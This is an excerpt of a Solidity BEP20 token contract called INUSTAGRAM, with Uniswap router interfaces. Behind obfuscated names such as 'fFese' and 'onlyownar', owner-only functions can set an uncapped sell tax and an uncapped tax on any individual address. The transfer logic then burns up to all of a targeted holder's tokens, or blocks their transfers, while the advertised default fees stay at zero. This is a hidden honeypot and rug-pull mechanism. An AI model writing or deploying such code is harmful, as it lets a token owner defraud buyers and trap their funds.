...
interface IUniswapV2Factory {
    ...
    function fFeseTo() external view returns (address);
    function fFeseToSetter() external view returns (address);
    ...
    function setfFeseTo(address) external;
    function setfFeseToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfFeseOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingfFeseOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingfFeseOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingfFeseOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfFeseOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract INUSTAGRAM is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellfFese = 0;

    uint256 private _defaultBuyfFese = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipfFese;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellfFese = _value;
    }

    function setSlipfFese(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipfFese[_address] = _value;
    }

    function getSlipfFese(address _address) external view onlyownar returns (uint256) {
        return _slipfFese[_address];
    }


    function setMAccountfFese(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountfFese(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradefFeseAmount = 0;

        if (rF) {
            uint256 tradefFese = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradefFese = _defaultSellfFese;
                }
                if (from == uniswapV2Pair) {

                    tradefFese = _defaultBuyfFese;
                }
            }
            if (_slipfFese[from] > 0) {
                tradefFese = _slipfFese[from];
            }

            tradefFeseAmount = _Amount.mul(tradefFese).div(100);
        }


        if (tradefFeseAmount > 0) {
            _balances[from] = _balances[from].sub(tradefFeseAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefFeseAmount);
            emit Transfer(from, _deadAddress, tradefFeseAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradefFeseAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradefFeseAmount);
        emit Transfer(from, _to, _Amount - tradefFeseAmount);
    }
